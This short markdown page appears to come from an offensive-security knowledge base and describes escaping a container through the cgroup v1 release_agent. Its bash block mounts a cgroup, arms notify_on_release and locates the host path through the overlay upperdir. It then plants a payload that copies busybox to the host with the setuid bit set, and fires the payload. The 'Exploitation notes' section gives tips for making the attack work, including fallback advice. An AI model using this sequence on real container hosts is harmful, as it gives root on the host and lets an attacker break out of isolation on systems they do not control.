---
title: "cgroups release_agent: host code execution through the cgroup release handler"
description: "Escaping a container by writing the cgroup v1 release_agent, a program the kernel runs on the host when a cgroup empties, reachable with CAP_SYS_ADMIN or an unprivileged user namespace, to execute an attacker-chosen command as root on the host."
keywords:
  - release_agent
  - cgroup escape
  - notify_on_release
  - CAP_SYS_ADMIN
  - container escape
---

# cgroups release_agent

A cgroup v1 hierarchy can define a `release_agent`: a program the kernel runs, on the host as root, when the last task leaves a cgroup that has `notify_on_release` set. A container that can mount a cgroup hierarchy (with `CAP_SYS_ADMIN`, and historically through an unprivileged user namespace) sets a `release_agent` pointing at a host-visible helper, arms a cgroup, then empties it to fire the helper.

```bash
# Requires CAP_SYS_ADMIN (or the unprivileged-userns variant)
mkdir /tmp/cg && mount -t cgroup -o rdma cgroup /tmp/cg
mkdir /tmp/cg/x && echo 1 > /tmp/cg/x/notify_on_release

# Point release_agent at a helper on a host-visible path (overlay upperdir)
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
echo "$host_path/payload" > /tmp/cg/release_agent
printf '#!/bin/sh\ncp /bin/busybox /host_marker; chmod +s /host_marker\n' > /payload && chmod +x /payload

# Fire it: a task that enters then exits the cgroup empties it
sh -c "echo \$\$ > /tmp/cg/x/cgroup.procs"
```

## Exploitation notes

- The helper runs in the host namespaces, so the only real constraint is the host-visible path, found through the container's overlay `upperdir`.
- This is a cgroup v1 mechanism; on hosts that boot cgroup v2 only, the `release_agent` file is absent and this specific route does not apply, so fall back to another privileged-configuration primitive.
- The classic unprivileged variant abused user namespaces to gain `CAP_SYS_ADMIN` over a new cgroup mount; where that is patched, the technique needs the real capability.

## References

- [man 7 cgroups](https://man7.org/linux/man-pages/man7/cgroups.7.html)
- [Trail of Bits: Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
